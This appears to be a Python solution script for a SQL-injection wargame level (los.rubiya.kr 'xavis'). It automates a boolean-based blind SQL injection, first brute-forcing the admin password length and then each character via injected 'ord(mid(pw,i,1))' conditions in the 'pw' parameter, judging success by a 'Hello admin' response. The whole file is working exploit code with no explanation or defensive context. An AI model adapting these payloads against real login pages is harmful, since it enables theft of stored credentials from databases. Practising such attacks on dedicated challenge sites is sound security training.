import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}

hello_admin="Hello admin"
length_pass=0
for x in range(20):
    url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw="+ urllib.parse.quote("1'   ||     length(pw) in({})#".format(x))
    print(url)
    res = requests.get(url,cookies=cookies)
    #print(res.text)
    if hello_admin in res.text:
        print("Password Lenght is "+str(x))
        length_pass=x
        break
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
    for j in range(1, 1000):
        url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=" +urllib.parse.quote("1' || id =\"admin\"   &&      " )+ urllib.parse.quote(" ord(mid(pw,{},1))={}#".format(str(i),j)) #substring(pw,1,1)=0
        print(url)
        req = requests.get(url, cookies=cookies)
        #print(pwd)
        if "Hello admin" in req.text:
            print(pwd)
            pwd += chr(j)
            break

print(pwd)
